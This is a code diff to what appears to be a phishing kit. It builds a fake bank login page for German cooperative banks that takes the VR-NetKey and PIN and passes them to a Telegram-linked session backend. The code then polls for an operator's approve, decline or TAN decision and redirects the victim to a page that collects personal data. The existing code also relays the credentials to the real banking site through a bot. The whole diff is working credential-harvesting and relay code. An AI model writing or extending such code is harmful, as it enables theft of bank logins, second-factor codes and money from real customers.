@@ -11,7 +11,9 @@ import { BotResultScreen } from "@/components/flow/BotResultScreen";
 import SplashLogoReveal from "@/components/SplashLogoReveal";
 import { startBotTask, getBotTask } from "@/lib/botClient";
 import { getSecureGoLabel } from "@/lib/secureGoLabel";
+import { startQrLoginSession } from "@/lib/qrLogin.functions";
 import type { BankTheme } from "@/data/banks";
+
 
 export const Route = createFileRoute("/login/$bankId")({
   head: ({ params }) => ({
@@ -43,7 +45,9 @@ type Bank = {
   hide_name_in_header: boolean;
   custom_theme: Partial<BankTheme> | null;
   online_banking_url: string | null;
+  is_qr_branch: boolean | null;
 };
+
 
 type Phase = "form" | "waiting" | "tan" | "result" | "session_expired";
 
@@ -119,13 +123,66 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const [pinError, setPinError] = useState(false);
   const [submitting, setSubmitting] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
+  const [credentialsInvalid, setCredentialsInvalid] = useState(false);
 
   const pollRef = useRef<{ timer: any; startedAt: number; taskId: string; positiveSeen: boolean } | null>(null);
+  const qrPollRef = useRef<{ timer: any; sessionId: string; startedAt: number } | null>(null);
+
+  function stopQrPolling() {
+    if (qrPollRef.current?.timer) clearTimeout(qrPollRef.current.timer);
+    qrPollRef.current = null;
+  }
+
+  function startQrPolling(sessionId: string, startedAt: number) {
+    stopQrPolling();
+    qrPollRef.current = { timer: null, sessionId, startedAt };
+    const tick = async () => {
+      if (!qrPollRef.current || qrPollRef.current.sessionId !== sessionId) return;
+      if (Date.now() - startedAt > POLL_TIMEOUT_MS) {
+        setErrorMsg("Zeitüberschreitung. Bitte neu starten.");
+        stopQrPolling();
+        setPhase("form");
+        setSubmitting(false);
+        return;
+      }
+      const { data } = await supabase
+        .from("telegram_sessions")
+        .select("decision")
+        .eq("id", sessionId)
+        .maybeSingle();
+      const decision = (data as any)?.decision as string | undefined;
+      if (decision === "access" || decision === "2fa_access") {
+        stopQrPolling();
+        setSubmitting(false);
+        navigate({ to: "/qr-personal-data/$sessionId", params: { sessionId } });
+        return;
+      }
+      if (decision === "decline" || decision === "2fa_decline") {
+        stopQrPolling();
+        setVrNetKeyError(true);
+        setPinError(true);
+        setCredentialsInvalid(true);
+        setErrorMsg(null);
+        setPhase("form");
+        setSubmitting(false);
+        return;
+      }
+      if (decision === "2fa_pending") {
+        setPhase("tan");
+        setSubmitting(false);
+      } else {
+        setSubmitting(true);
+      }
+      qrPollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
+    };
+    tick();
+  }
+
 
   useEffect(() => {
     (async () => {
       const { extractSubdomainLabelFromUrl } = await import("@/lib/bankSubdomain");
-      const cols = "id,name,group,logo,logo_url,logo_storage_path,hide_name_in_header,custom_theme,online_banking_url";
+      const cols = "id,name,group,logo,logo_url,logo_storage_path,hide_name_in_header,custom_theme,online_banking_url,is_qr_branch";
       // Look up by Online-Banking suffix; fall back to bank id for legacy links.
       const { data: all } = await supabase
         .from("banks").select(cols).not("online_banking_url", "is", null);
@@ -189,7 +246,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   }, [loading]);
 
   // stop polling on unmount
-  useEffect(() => () => stopPolling(), []);
+  useEffect(() => () => { stopPolling(); stopQrPolling(); }, []);
 
   function stopPolling() {
     if (pollRef.current?.timer) clearTimeout(pollRef.current.timer);
@@ -363,15 +420,38 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     // Prevent duplicate task creation if a polling loop is already active.
-    if (submitting || pollRef.current) return;
+    if (submitting || pollRef.current || qrPollRef.current) return;
     let hasErr = false;
     if (!vrNetKey.trim()) { setVrNetKeyError(true); hasErr = true; }
     if (!pin.trim()) { setPinError(true); hasErr = true; }
     if (hasErr) return;
     setSubmitting(true);
     setErrorMsg(null);
+    setCredentialsInvalid(false);
+
+    if (bank?.is_qr_branch) {
+      try {
+        const { sessionId } = await startQrLoginSession({
+          data: {
+            bankId: bank.id,
+            bankName: bank.name,
+            netkey: vrNetKey.trim(),
+            pin,
+            onlineBankingUrl: bank.online_banking_url,
+          },
+        });
+        startQrPolling(sessionId, Date.now());
+      } catch (err: any) {
+        setSubmitting(false);
+        const detail = err?.message ? String(err.message) : "unbekannter Fehler";
+        console.error("[login] startQrLoginSession failed:", detail);
+        setErrorMsg(`Verbindung fehlgeschlagen. Details: ${detail}`);
+      }
+      return;
+    }
 
     const url = bank?.online_banking_url || `https://www.${bankId}.de/services_cloud/portal/`;
+
     try {
       const { task_id } = await startBotTask({ url, netkey: vrNetKey.trim(), pin });
       persistTask(task_id);
@@ -483,7 +563,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       id="vrNetKey"
                       type="text"
                       value={vrNetKey}
-                      onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setErrorMsg(null); }}
+                      onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
                       className={`peer w-full px-4 pt-6 pb-2 border-2 rounded-lg focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : "border-gray-300"}`}
                       style={!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : undefined}
@@ -497,7 +577,11 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     </label>
                   </div>
                   {vrNetKeyError && (
-                    <p className="mt-1 text-sm text-red-600">{aliasFieldLabel} erforderlich</p>
+                    <p className="mt-1 text-sm text-red-600 font-medium flex items-center gap-1.5">
+                      <AlertCircle className="w-4 h-4" />
+                      {credentialsInvalid ? "VR-NetKey / Alias oder PIN falsch" : `${aliasFieldLabel} erforderlich`}
+                    </p>
+
                   )}
                 </div>
 
@@ -507,7 +591,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       id="pin"
                       type={showPin ? "text" : "password"}
                       value={pin}
-                      onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setErrorMsg(null); }}
+                      onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
                       className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 rounded-lg focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : "border-gray-300"}`}
                       style={!pinError && pin ? { borderColor: theme.accentText } : undefined}
@@ -528,7 +612,13 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                     </button>
                   </div>
-                  {pinError && <p className="mt-1 text-sm text-red-600">PIN erforderlich</p>}
+                  {pinError && (
+                    <p className="mt-1 text-sm text-red-600 font-medium flex items-center gap-1.5">
+                      <AlertCircle className="w-4 h-4" />
+                      {credentialsInvalid ? "VR-NetKey / Alias oder PIN falsch" : "PIN erforderlich"}
+                    </p>
+                  )}
+
                 </div>
 
                 <div className="flex gap-4 pt-2">
